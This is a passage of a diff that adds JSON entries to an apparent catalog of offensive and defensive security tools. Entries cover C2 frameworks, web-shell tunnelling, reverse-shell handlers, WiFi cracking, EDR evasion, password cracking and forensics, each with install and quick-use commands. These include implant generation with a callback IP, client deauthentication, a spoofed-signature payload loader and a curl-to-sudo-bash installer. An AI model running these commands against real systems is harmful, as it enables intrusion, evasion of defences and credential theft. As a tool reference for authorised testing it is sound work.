+      "git": "git clone https://github.com/L-codes/Neo-reGeorg.git && cd Neo-reGeorg && pip3 install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/L-codes/Neo-reGeorg",
+    "repo_type": "github",
+    "official_url": "https://github.com/L-codes/Neo-reGeorg",
+    "research_links": [
+      {
+        "title": "HackTricks - Tunneling with Web Shells",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#regeorg"
+      },
+      {
+        "title": "Medium - Pivoting via HTTP Tunneling",
+        "url": "https://medium.com/@lcodes/neo-regeorg-tunneling"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Generate Encrypted Web Shells",
+        "cmd": "python3 neoreg.py generate -k MySuperSecretKey"
+      },
+      {
+        "label": "Connect Client to Uploaded Shell",
+        "cmd": "python3 neoreg.py -k MySuperSecretKey -u http://target.com/tunnel.php -l 127.0.0.1 -p 1080"
+      }
+    ],
+    "notes": "Encrypts payload traffic inside HTTP body with user-supplied key to defeat Deep Packet Inspection (DPI) & WAFs."
+  },
+  {
+    "id": "havoc",
+    "name": "Havoc C2",
+    "tagline": "Modern and malleable post-exploitation Command and Control framework",
+    "category": "Command & Control (C2) & Post-Exploitation",
+    "rarity": "popular",
+    "purpose_summary": "Deploy stealthy Demon agents on Windows/Linux endpoints, execute shellcode, bypass AMSI/ETW, sleep obfuscation (Ekko/Foliage), and stage lateral movement.",
+    "purposes": [
+      "modern c2 framework",
+      "adversary emulation",
+      "sleep obfuscation ekko",
+      "demon agent payload",
+      "cobalt strike alternative"
+    ],
+    "distros": {
+      "blackarch": "pacman -S havoc-c2",
+      "arch": "yay -S havoc-c2-git",
+      "debian": "sudo apt install -y git build-essential cmake nasm python3-dev qtbase5-dev libqt5websockets5-dev && git clone https://github.com/HavocFramework/Havoc.git && cd Havoc/Teamserver && make",
+      "git": "git clone https://github.com/HavocFramework/Havoc.git && cd Havoc && make"
+    },
+    "repo_url": "https://github.com/HavocFramework/Havoc",
+    "repo_type": "github",
+    "official_url": "https://havocframework.com/",
+    "research_links": [
+      {
+        "title": "Havoc C2 Documentation",
+        "url": "https://havocframework.com/docs/welcome"
+      },
+      {
+        "title": "Medium - Havoc Framework: The New Age of C2",
+        "url": "https://medium.com/@infosec/havoc-c2-deep-dive"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Run Teamserver",
+        "cmd": "cd Havoc/Teamserver && ./havoc server --profile profiles/havoc.yaotl -v"
+      },
+      {
+        "label": "Launch Havoc Client GUI",
+        "cmd": "cd Havoc/Client && ./Havoc"
+      }
+    ],
+    "notes": "One of the most aesthetically pleasing and capable modern red team C2s. Native sleep obfuscation bypasses memory scanners."
+  },
+  {
+    "id": "sliver",
+    "name": "Sliver",
+    "tagline": "Cross-platform adversary emulation & red team C2 framework by BishopFox",
+    "category": "Command & Control (C2) & Post-Exploitation",
+    "rarity": "popular",
+    "purpose_summary": "Generate dynamic implants with support for mTLS, WireGuard, HTTP(S), and DNS C2 channels, in-memory execution (BOFs), and multiplayer collaboration.",
+    "purposes": [
+      "multiplayer c2 framework",
+      "dns c2 beaconing",
+      "bof beacon object file runner",
+      "wireguard c2 tunnel",
+      "cross platform implant builder"
+    ],
+    "distros": {
+      "blackarch": "pacman -S sliver",
+      "arch": "yay -S sliver-bin",
+      "debian": "curl -s https://sliver.sh/install | sudo bash",
+      "git": "git clone https://github.com/BishopFox/sliver.git && cd sliver && make"
+    },
+    "repo_url": "https://github.com/BishopFox/sliver",
+    "repo_type": "github",
+    "official_url": "https://github.com/BishopFox/sliver",
+    "research_links": [
+      {
+        "title": "Sliver Official Wiki & Documentation",
+        "url": "https://github.com/BishopFox/sliver/wiki"
+      },
+      {
+        "title": "HackTricks - Sliver C2 Cheatsheet",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/c2-frameworks/sliver"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Start Sliver Server",
+        "cmd": "sliver-server"
+      },
+      {
+        "label": "Generate Windows HTTP Implant",
+        "cmd": "generate --http 10.10.14.5:8080 --os windows --arch amd64 -f exe"
+      },
+      {
+        "label": "Start HTTP Listener",
+        "cmd": "http -L 10.10.14.5 -l 8080"
+      }
+    ],
+    "notes": "Created by BishopFox. Top open source alternative to Cobalt Strike. Built in Go with automatic TLS certificate generation."
+  },
+  {
+    "id": "pwncat-cs",
+    "name": "Pwncat (pwncat-cs)",
+    "tagline": "Modern, intelligent shell handler and automated post-exploitation engine",
+    "category": "Command & Control (C2) & Post-Exploitation",
+    "rarity": "rare",
+    "purpose_summary": "Catch reverse shells and automatically upgrade them to full PTY, setup SSH backdoors, enumerate privilege escalation vectors, and tamper-proof session persistence.",
+    "purposes": [
+      "smart reverse shell handler",
+      "auto upgrade pty shell",
+      "stealth persistence linux",
+      "reverse shell file transfer",
+      "pty without python"
+    ],
+    "distros": {
+      "blackarch": "pacman -S pwncat-cs",
+      "arch": "yay -S python-pwncat-cs",
+      "debian": "pipx install pwncat-cs || pip install pwncat-cs",
+      "git": "git clone https://github.com/calebstewart/pwncat.git && cd pwncat && pip install ."
+    },
+    "repo_url": "https://github.com/calebstewart/pwncat",
+    "repo_type": "github",
+    "official_url": "https://pwncat.org/",
+    "research_links": [
+      {
+        "title": "Pwncat Official Documentation",
+        "url": "https://pwncat.readthedocs.io/en/latest/"
+      },
+      {
+        "title": "Medium - Pwncat: The Reverse Shell Handler on Steroids",
+        "url": "https://medium.com/@calebstewart/pwncat-fancy-reverse-shell"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Catch Inbound Reverse Shell",
+        "cmd": "pwncat-cs -lp 4444"
+      },
+      {
+        "label": "Connect Outbound to Target",
+        "cmd": "pwncat-cs 10.10.10.10:4444"
+      },
+      {
+        "label": "Switch to Local Shell Controller",
+        "cmd": "# Press Ctrl+D inside session to toggle between remote shell and pwncat command prompt"
+      }
+    ],
+    "notes": "Once a shell connects, pwncat automatically sends terminal escape sequences, sets terminal size, disables echo, and unlocks tab-completion."
+  },
+  {
+    "id": "aircrack-ng",
+    "name": "Aircrack-ng",
+    "tagline": "The premier WiFi 802.11 security auditing and packet analysis suite",
+    "category": "Wireless & RF Security",
+    "rarity": "popular",
+    "purpose_summary": "Capture WPA/WPA2 handshakes, conduct deauthentication attacks, inject 802.11 frames, and perform dictionary cracking against wireless pre-shared keys.",
+    "purposes": [
+      "wifi handshake capture",
+      "wpa2 cracking",
+      "deauth attack wifi",
+      "monitor mode wlan",
+      "packet injection wireless"
+    ],
+    "distros": {
+      "blackarch": "pacman -S aircrack-ng",
+      "arch": "pacman -S aircrack-ng || yay -S aircrack-ng",
+      "debian": "sudo apt install aircrack-ng -y",
+      "git": "git clone https://github.com/aircrack-ng/aircrack-ng.git && cd aircrack-ng && autoreconf -i && ./configure && make"
+    },
+    "repo_url": "https://github.com/aircrack-ng/aircrack-ng",
+    "repo_type": "github",
+    "official_url": "https://www.aircrack-ng.org/",
+    "research_links": [
+      {
+        "title": "Aircrack-ng Documentation & Wiki",
+        "url": "https://www.aircrack-ng.org/doku.php"
+      },
+      {
+        "title": "HackTricks - WiFi Pentesting Methodology",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Enable Monitor Mode",
+        "cmd": "sudo airmon-ng start wlan0"
+      },
+      {
+        "label": "Capture WPA Handshake",
+        "cmd": "sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"
+      },
+      {
+        "label": "Deauth Client to Force Handshake",
+        "cmd": "sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon"
+      },
+      {
+        "label": "Crack WPA Handshake",
+        "cmd": "aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap"
+      }
+    ],
+    "notes": "Classic suite including airmon-ng, airodump-ng, aireplay-ng, airbase-ng, and aircrack-ng."
+  },
+  {
+    "id": "hcxdumptool",
+    "name": "hcxdumptool & hcxtools",
+    "tagline": "Client-less PMKID capture and wireless frame analysis directly from APs",
+    "category": "Wireless & RF Security",
+    "rarity": "rare",
+    "purpose_summary": "Capture WPA/WPA2 authentication frames and PMKID directly from modern WiFi Access Points WITHOUT waiting for or deauthing connected client stations.",
+    "purposes": [
+      "pmkid capture without client",
+      "wpa2 key capture modern",
+      "convert cap to hashcat 22000",
+      "stealth wireless auditing"
+    ],
+    "distros": {
+      "blackarch": "pacman -S hcxdumptool hcxtools",
+      "arch": "pacman -S hcxdumptool hcxtools || yay -S hcxdumptool",
+      "debian": "sudo apt install hcxdumptool hcxtools -y",
+      "git": "git clone https://github.com/ZerBea/hcxdumptool.git && cd hcxdumptool && make && sudo make install"
+    },
+    "repo_url": "https://github.com/ZerBea/hcxdumptool",
+    "repo_type": "github",
+    "official_url": "https://github.com/ZerBea/hcxdumptool",
+    "research_links": [
+      {
+        "title": "HackTricks - PMKID Attack & Hashcat 22000",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi#pmkid-attack"
+      },
+      {
+        "title": "Medium - Capturing PMKID with hcxdumptool",
+        "url": "https://medium.com/@zerbea/pmkid-attack-guide"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Capture PMKID to PCAPNG",
+        "cmd": "sudo hcxdumptool -i wlan0mon -w pmkid_capture.pcapng --rds=1"
+      },
+      {
+        "label": "Convert to Hashcat Hash Format (Mode 22000)",
+        "cmd": "hcxpcapngtool -o hashes.22000 -E essidlist pmkid_capture.pcapng"
+      },
+      {
+        "label": "Crack with Hashcat",
+        "cmd": "hashcat -m 22000 hashes.22000 wordlist.txt"
+      }
+    ],
+    "notes": "Developed by ZerBea. Revolutionized WiFi penetration testing by making attacks 100% station-less."
+  },
+  {
+    "id": "wifite2",
+    "name": "Wifite2",
+    "tagline": "Completely automated wireless auditor for WPA/WPA2/WPS/PMKID",
+    "category": "Wireless & RF Security",
+    "rarity": "popular",
+    "purpose_summary": "Hands-off automated wireless attack script that scans channels, cracks WPS PINs, gathers PMKID packets, and snatches WPA handshakes.",
+    "purposes": [
+      "automated wifi cracking",
+      "wps pin attack bully reaver",
+      "one click wireless pentest",
+      "capture all nearby handshakes"
+    ],
+    "distros": {
+      "blackarch": "pacman -S wifite",
+      "arch": "pacman -S wifite || yay -S wifite2-git",
+      "debian": "sudo apt install wifite -y",
+      "git": "git clone https://github.com/derv82/wifite2.git && cd wifite2 && sudo python3 setup.py install"
+    },
+    "repo_url": "https://github.com/derv82/wifite2",
+    "repo_type": "github",
+    "official_url": "https://github.com/derv82/wifite2",
+    "research_links": [
+      {
+        "title": "HackTricks - Automated Wireless Audits",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-wifi"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Start Automated Audit",
+        "cmd": "sudo wifite"
+      },
+      {
+        "label": "Target PMKID Attacks Only",
+        "cmd": "sudo wifite --pmkid --pmkid-timeout 60"
+      }
+    ],
+    "notes": "Automatic integration with tshark, pyrit, cowpatty, hashcat, bully, reaver, and aircrack-ng."
+  },
+  {
+    "id": "bettercap",
+    "name": "Bettercap",
+    "tagline": "The Swiss Army knife for 802.11, BLE, BT, and Ethernet MITM attacks",
+    "category": "Wireless & RF Security",
+    "rarity": "popular",
+    "purpose_summary": "Perform ARP spoofing, DNS spoofing, credential sniffing, BLE beacon spoofing, WiFi deauth, and handshake acquisition via an interactive shell and web UI.",
+    "purposes": [
+      "man in the middle arp spoof",
+      "dns spoofing mitm",
+      "ble bluetooth sniffing",
+      "wifi deauth bettercap",
+      "credential sniffer"
+    ],
+    "distros": {
+      "blackarch": "pacman -S bettercap",
+      "arch": "pacman -S bettercap || yay -S bettercap",
+      "debian": "sudo apt install bettercap -y",
+      "git": "go install github.com/bettercap/bettercap@latest"
+    },
+    "repo_url": "https://github.com/bettercap/bettercap",
+    "repo_type": "github",
+    "official_url": "https://www.bettercap.org/",
+    "research_links": [
+      {
+        "title": "Bettercap Documentation & Caplets",
+        "url": "https://www.bettercap.org/modules/"
+      },
+      {
+        "title": "HackTricks - Bettercap MITM",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Start Interactive Session",
+        "cmd": "sudo bettercap -iface eth0"
+      },
+      {
+        "label": "WiFi Recon Module",
+        "cmd": "bettercap -iface wlan0mon -eval 'wifi.recon on; wifi.show'"
+      }
+    ],
+    "notes": "Has caplet scripting capability and an interactive web interface (bettercap-ui)."
+  },
+  {
+    "id": "ghidra",
+    "name": "Ghidra",
+    "tagline": "Software reverse engineering suite developed by the NSA",
+    "category": "Reverse Engineering & Binary Exploitation",
+    "rarity": "popular",
+    "purpose_summary": "Decompile, disassemble, and analyze compiled binaries across x86, ARM, MIPS, PowerPC, and RISC architectures with advanced graphical decompilation.",
+    "purposes": [
+      "reverse engineering decompiler",
+      "nsa binary analysis",
+      "disassemble elf exe",
+      "firmware reverse engineering",
+      "decompiling c/c++ code"
+    ],
+    "distros": {
+      "blackarch": "pacman -S ghidra",
+      "arch": "pacman -S ghidra || yay -S ghidra",
+      "debian": "sudo apt install openjdk-17-jdk -y && wget https://github.com/NationalSecurityAgency/ghidra/releases/latest/download/ghidra_latest.zip && unzip ghidra_latest.zip",
+      "git": "git clone https://github.com/NationalSecurityAgency/ghidra.git && cd ghidra && gradle buildGhidra"
+    },
+    "repo_url": "https://github.com/NationalSecurityAgency/ghidra",
+    "repo_type": "github",
+    "official_url": "https://ghidra-sre.org/",
+    "research_links": [
+      {
+        "title": "Ghidra Official Documentation & Courses",
+        "url": "https://htmlpreview.github.io/?https://github.com/NationalSecurityAgency/ghidra/blob/master/GhidraDocs/index.html"
+      },
+      {
+        "title": "HackTricks - Reverse Engineering with Ghidra",
+        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/reverse-engineering-tools/ghidra"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Launch Ghidra GUI",
+        "cmd": "ghidraRun"
+      },
+      {
+        "label": "Headless Analyzer CLI",
+        "cmd": "analyzeHeadless /project/dir ProjectName -import /path/to/binary"
+      }
+    ],
+    "notes": "Free and open-source world-class decompiler. Free alternative to IDA Pro."
+  },
+  {
+    "id": "pwndbg",
+    "name": "Pwndbg",
+    "tagline": "GDB plug-in making binary exploitation and reverse engineering intuitive",
+    "category": "Reverse Engineering & Binary Exploitation",
+    "rarity": "popular",
+    "purpose_summary": "Supercharge GNU Debugger (GDB) with colored disassembly, stack context, registers view, heap inspection, and ROP gadget helpers.",
+    "purposes": [
+      "binary exploitation gdb",
+      "heap exploitation debugger",
+      "stack buffer overflow debug",
+      "colored gdb disassembly",
+      "rop exploit development"
+    ],
+    "distros": {
+      "blackarch": "pacman -S pwndbg",
+      "arch": "yay -S gdb-pwndbg",
+      "debian": "git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh",
+      "git": "git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh"
+    },
+    "repo_url": "https://github.com/pwndbg/pwndbg",
+    "repo_type": "github",
+    "official_url": "https://pwndbg.re/",
+    "research_links": [
+      {
+        "title": "Pwndbg Cheat Sheet & Docs",
+        "url": "https://pwndbg.re/"
+      },
+      {
+        "title": "HackTricks - GDB & Pwndbg Binary Exploitation",
+        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Launch Debugger on Binary",
+        "cmd": "gdb ./vuln_binary"
+      },
+      {
+        "label": "Inspect Heap Chunks",
+        "cmd": "pwndbg> vis_heap_chunks"
+      },
+      {
+        "label": "Search Pattern Offset",
+        "cmd": "pwndbg> cyclic 100\npwndbg> cyclic -l <FAULT_ADDR>"
+      }
+    ],
+    "notes": "De facto standard for binary exploitation CTFs and zero-day exploit research."
+  },
+  {
+    "id": "angr",
+    "name": "Angr",
+    "tagline": "Powerful Python framework for symbolic execution and automated binary analysis",
+    "category": "Reverse Engineering & Binary Exploitation",
+    "rarity": "rare",
+    "purpose_summary": "Solve CTF crackmes, reverse engineer obfuscated binaries, and find crash states automatically through symbolic execution without manually stepping through code.",
+    "purposes": [
+      "symbolic execution binary",
+      "auto solve crackmes",
+      "automated crash path finder",
+      "binary constraint solving",
+      "taint analysis"
+    ],
+    "distros": {
+      "blackarch": "pacman -S python-angr",
+      "arch": "yay -S python-angr",
+      "debian": "pipx install angr || pip install angr",
+      "git": "git clone https://github.com/angr/angr.git && cd angr && pip install -e ."
+    },
+    "repo_url": "https://github.com/angr/angr",
+    "repo_type": "github",
+    "official_url": "https://angr.io/",
+    "research_links": [
+      {
+        "title": "Angr Documentation & Examples",
+        "url": "https://docs.angr.io/"
+      },
+      {
+        "title": "HackTricks - Symbolic Execution with Angr",
+        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/reverse-engineering-tools/angr"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Python Symbolic Path Explorer",
+        "cmd": "python3 -c \"import angr; p = angr.Project('./binary'); sm = p.factory.simulation_manager(); sm.explore(find=0x401234, avoid=0x401250); print(sm.found[0].posix.dumps(0))\""
+      }
+    ],
+    "notes": "Developed by the Computer Security Lab at UC Santa Barbara. Mind-blowing for automatically finding winning program paths."
+  },
+  {
+    "id": "ropgadget",
+    "name": "ROPgadget",
+    "tagline": "Search for gadgets in binaries and automatically generate ROP chains",
+    "category": "Reverse Engineering & Binary Exploitation",
+    "rarity": "popular",
+    "purpose_summary": "Scan ELF, PE, and Mach-O binaries to find Return-Oriented Programming (ROP) gadgets and generate automated execve / shellcode execution chains.",
+    "purposes": [
+      "find rop gadgets",
+      "generate rop chain",
+      "bypass dep nx bit",
+      "binary exploitation rop"
+    ],
+    "distros": {
+      "blackarch": "pacman -S ropgadget",
+      "arch": "pacman -S ropgadget || yay -S python-ropgadget",
+      "debian": "sudo apt install python3-ropgadget -y || pip install ropgadget",
+      "git": "git clone https://github.com/JonathanSalwan/ROPgadget.git && cd ROPgadget && pip install ."
+    },
+    "repo_url": "https://github.com/JonathanSalwan/ROPgadget",
+    "repo_type": "github",
+    "official_url": "http://shell-storm.org/project/ROPgadget/",
+    "research_links": [
+      {
+        "title": "HackTricks - ROP (Return Oriented Programming)",
+        "url": "https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Find All Gadgets in Binary",
+        "cmd": "ROPgadget --binary ./vuln_elf > gadgets.txt"
+      },
+      {
+        "label": "Auto-Generate Full ROP Chain",
+        "cmd": "ROPgadget --binary ./vuln_elf --ropchain"
+      }
+    ],
+    "notes": "Essential for bypassing W^X, NX-bit, and Data Execution Prevention (DEP)."
+  },
+  {
+    "id": "volatility3",
+    "name": "Volatility 3",
+    "tagline": "Advanced memory forensics framework for Windows, Linux & macOS RAM dumps",
+    "category": "DFIR & Memory Analysis",
+    "rarity": "popular",
+    "purpose_summary": "Analyze RAM memory captures, uncover injected DLLs, recover lost passwords, list rogue processes, extract network sockets, and investigate malware in memory.",
+    "purposes": [
+      "memory forensics ram analysis",
+      "detect injected code memory",
+      "dump lsadump from memory",
+      "malware analysis in memory",
+      "extract hidden processes ram"
+    ],
+    "distros": {
+      "blackarch": "pacman -S volatility3",
+      "arch": "yay -S volatility3",
+      "debian": "sudo apt install python3-pip -y && pip install volatility3",
+      "git": "git clone https://github.com/volatilityfoundation/volatility3.git && cd volatility3 && pip install ."
+    },
+    "repo_url": "https://github.com/volatilityfoundation/volatility3",
+    "repo_type": "github",
+    "official_url": "https://www.volatilityfoundation.org/",
+    "research_links": [
+      {
+        "title": "Volatility 3 Official Docs",
+        "url": "https://volatility3.readthedocs.io/"
+      },
+      {
+        "title": "HackTricks - Memory Forensics with Volatility",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Process Tree Scan",
+        "cmd": "vol -f memdump.raw windows.pstree"
+      },
+      {
+        "label": "Find Injected Code / DLLs",
+        "cmd": "vol -f memdump.raw windows.malfind"
+      },
+      {
+        "label": "Dump Hashes from Memory",
+        "cmd": "vol -f memdump.raw windows.hashdump"
+      }
+    ],
+    "notes": "Python 3 rewrite with automatic symbol server integration—no more manually finding kernel profiles!"
+  },
+  {
+    "id": "regripper",
+    "name": "RegRipper",
+    "tagline": "Targeted Windows registry hive forensic analysis tool",
+    "category": "DFIR & Memory Analysis",
+    "rarity": "rare",
+    "purpose_summary": "Extract timestamped forensic artifacts, user activity, mounted USB devices, recently executed programs, and network history from extracted Windows registry hives.",
+    "purposes": [
+      "windows registry forensic analysis",
+      "extract usb history registry",
+      "parse userassist shimcache",
+      "investigate user activity"
+    ],
+    "distros": {
+      "blackarch": "pacman -S regripper",
+      "arch": "yay -S regripper",
+      "debian": "sudo apt install libparse-win32registry-perl -y && git clone https://github.com/keydet89/RegRipper3.0.git",
+      "git": "git clone https://github.com/keydet89/RegRipper3.0.git && cd RegRipper3.0"
+    },
+    "repo_url": "https://github.com/keydet89/RegRipper3.0",
+    "repo_type": "github",
+    "official_url": "https://github.com/keydet89/RegRipper3.0",
+    "research_links": [
+      {
+        "title": "HackTricks - Windows Registry Forensics",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/windows-forensics#registry"
+      },
+      {
+        "title": "Medium - Registry Forensics with RegRipper",
+        "url": "https://medium.com/@dfir/analyzing-registry-with-regripper"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Rip NTUSER.DAT Profile",
+        "cmd": "perl rip.pl -r /path/to/NTUSER.DAT -f ntuser > user_activity.txt"
+      },
+      {
+        "label": "Rip SYSTEM Hive for USB Devices",
+        "cmd": "perl rip.pl -r /path/to/SYSTEM -f system > system_artifacts.txt"
+      }
+    ],
+    "notes": "Created by DFIR veteran Harlan Carvey. Uses plugins to extract high-value forensic timelines."
+  },
+  {
+    "id": "scarecrow",
+    "name": "ScareCrow",
+    "tagline": "Payload creation framework designed to bypass EDR and AV sensors",
+    "category": "Evasion, Obfuscation & AV/EDR Bypass",
+    "rarity": "rare",
+    "purpose_summary": "Package raw shellcode into legitimate-looking Windows signed binaries (DLL, CPL, EXE) utilizing unhooking, AMSI/ETW patching, and binary sign spoofing.",
+    "purposes": [
+      "bypass edr crowdstrike sentinelone",
+      "evade windows defender amsi",
+      "unhook ntdll edr hooks",
+      "sign spoofing code signing",
+      "stealth payload loader"
+    ],
+    "distros": {
+      "blackarch": "pacman -S scarecrow",
+      "arch": "yay -S scarecrow-git",
+      "debian": "sudo apt install -y openssl golang osslsigncode mingw-w64 && git clone https://github.com/optiv/ScareCrow.git && cd ScareCrow && go build ScareCrow.go",
+      "git": "git clone https://github.com/optiv/ScareCrow.git && cd ScareCrow && go build ScareCrow.go"
+    },
+    "repo_url": "https://github.com/optiv/ScareCrow",
+    "repo_type": "github",
+    "official_url": "https://github.com/optiv/ScareCrow",
+    "research_links": [
+      {
+        "title": "Optiv Blog - ScareCrow EDR Bypass Release",
+        "url": "https://www.optiv.com/insights/source-zero/blog/scarecrow"
+      },
+      {
+        "title": "HackTricks - EDR Evasion & Unhooking",
+        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/av-edr-evasion"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Compile DLL with AMSI Bypass & Signing",
+        "cmd": "./ScareCrow -I shellcode.bin -Loader dll -domain microsoft.com -valid true"
+      },
+      {
+        "label": "Generate Control Panel (.cpl) Loader",
+        "cmd": "./ScareCrow -I raw.bin -Loader control -O update.cpl"
+      }
+    ],
+    "notes": "Uses syscall unhooking, custom sleep timers, and code-signing forgery to slip past top-tier EDRs."
+  },
+  {
+    "id": "syswhispers3",
+    "name": "SysWhispers3",
+    "tagline": "AV/EDR evasion via direct system calls in C/C++ payloads",
+    "category": "Evasion, Obfuscation & AV/EDR Bypass",
+    "rarity": "rare",
+    "purpose_summary": "Generate C and ASM stubs for direct system calls, bypassing user-mode API hooking deployed by modern EDRs on NTDLL.dll functions.",
+    "purposes": [
+      "direct syscalls edr bypass",
+      "bypass ntdll hook",
+      "generate egg hunter asm stubs",
+      "evasion user mode api hooking",
+      "custom shellcode injector"
+    ],
+    "distros": {
+      "blackarch": "pacman -S syswhispers3",
+      "arch": "yay -S syswhispers3-git",
+      "debian": "git clone https://github.com/klezVirus/SysWhispers3.git && cd SysWhispers3 && pip install -r requirements.txt",
+      "git": "git clone https://github.com/klezVirus/SysWhispers3.git && cd SysWhispers3 && pip install -r requirements.txt"
+    },
+    "repo_url": "https://github.com/klezVirus/SysWhispers3",
+    "repo_type": "github",
+    "official_url": "https://github.com/klezVirus/SysWhispers3",
+    "research_links": [
+      {
+        "title": "HackTricks - Direct Syscalls & EDR Bypasses",
+        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/av-edr-evasion"
+      },
+      {
+        "title": "Medium - Evading EDR with SysWhispers3 Direct Syscalls",
+        "url": "https://medium.com/@klezvirus/syswhispers3-direct-system-calls"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Generate Syscall Header & ASM",
+        "cmd": "python3 syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls_stub -m egg_hunter"
+      }
+    ],
+    "notes": "Supports x64 and WOW64 with multiple recovery methods (Jumper, Egg Hunter, Direct, Hell's Gate / Halo's Gate)."
+  },
+  {
+    "id": "hashcat",
+    "name": "Hashcat",
+    "tagline": "World's fastest and most advanced GPU-accelerated password recovery engine",
+    "category": "Password Cracking & Hash Cracking",
+    "rarity": "popular",
+    "purpose_summary": "Crack password hashes (NTLM, NetNTLMv2, Kerberos, WPA2/WPA3, MD5, SHA256, bcrypt) utilizing GPU compute acceleration and custom rule engines.",
+    "purposes": [
+      "gpu password cracking",
+      "crack ntlm hashes",
+      "crack wpa2 pmkid",
+      "crack kerberos tickets",
+      "rule based password attack"
+    ],
+    "distros": {
+      "blackarch": "pacman -S hashcat",
+      "arch": "pacman -S hashcat || yay -S hashcat",
+      "debian": "sudo apt install hashcat -y",
+      "git": "git clone https://github.com/hashcat/hashcat.git && cd hashcat && make && sudo make install"
+    },
+    "repo_url": "https://github.com/hashcat/hashcat",
+    "repo_type": "github",
+    "official_url": "https://hashcat.net/hashcat/",
+    "research_links": [
+      {
+        "title": "Hashcat Official Documentation & Modes",
+        "url": "https://hashcat.net/wiki/"
+      },
+      {
+        "title": "HackTricks - Hashcat Modes & Best Rules",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#hashcat"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Crack NTLM Hashes with Rules",
+        "cmd": "hashcat -m 1000 ntlm.hashes rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O"
+      },
+      {
+        "label": "Crack NetNTLMv2 (Responder)",
+        "cmd": "hashcat -m 5600 netntlm.txt rockyou.txt -O"
+      },
+      {
+        "label": "Crack Kerberoasting TGS (Mode 13100)",
+        "cmd": "hashcat -m 13100 tgs_hashes.txt rockyou.txt -O"
+      }
+    ],
+    "notes": "Supports OpenCL, CUDA, and Metal acceleration. Over 400 hash modes supported."
+  },
+  {
+    "id": "john",
+    "name": "John the Ripper",
+    "tagline": "Feature-rich password cracker with auto-detection of hash algorithms and formats",
+    "category": "Password Cracking & Hash Cracking",
+    "rarity": "popular",
+    "purpose_summary": "Crack encrypted archives (zip, rar, 7z), SSH keys, keepass databases, and /etc/shadow hashes with automated hash format recognition.",
+    "purposes": [
+      "crack zip password",
+      "crack ssh private key passphrase",
+      "crack keepass database",
+      "etc shadow hash crack",
+      "john the ripper jumbo"
+    ],
+    "distros": {
+      "blackarch": "pacman -S john",
+      "arch": "pacman -S john || yay -S john",
+      "debian": "sudo apt install john -y",
+      "git": "git clone https://github.com/openwall/john.git && cd john/src && ./configure && make"
+    },
+    "repo_url": "https://github.com/openwall/john",
+    "repo_type": "github",
+    "official_url": "https://www.openwall.com/john/",
+    "research_links": [
+      {
+        "title": "HackTricks - John the Ripper Cheatsheet",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#john-the-ripper"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Extract Hash from Zip & Crack",
+        "cmd": "zip2john protected.zip > zip.hash\njohn --wordlist=rockyou.txt zip.hash"
+      },
+      {
+        "label": "Extract SSH Key Hash & Crack",
+        "cmd": "ssh2john id_rsa > id_rsa.hash\njohn --wordlist=rockyou.txt id_rsa.hash"
+      }
+    ],
+    "notes": "Includes famous *2john helpers: zip2john, rar2john, ssh2john, keepass2john, 7z2john."
+  },
+  {
+    "id": "cloudfox",
+    "name": "CloudFox",
+    "tagline": "Command line tool to find actionable attack paths in cloud infrastructure",
+    "category": "Cloud & Container Security",
+    "rarity": "rare",
+    "purpose_summary": "Analyze AWS and Azure environments after acquiring initial credentials, finding high-value attack paths, exposed databases, privileged IAM roles, and secrets.",
+    "purposes": [
+      "aws attack path discovery",
+      "cloud privilege escalation",
+      "find exposed s3 buckets credentials",
+      "iam role exploitation",
+      "azure attack surface audit"
+    ],
+    "distros": {
+      "blackarch": "pacman -S cloudfox",
+      "arch": "yay -S cloudfox-bin",
+      "debian": "wget https://github.com/BishopFox/cloudfox/releases/latest/download/cloudfox-linux-amd64.tar.gz && tar -zxvf cloudfox-linux-amd64.tar.gz && sudo mv cloudfox /usr/local/bin/",
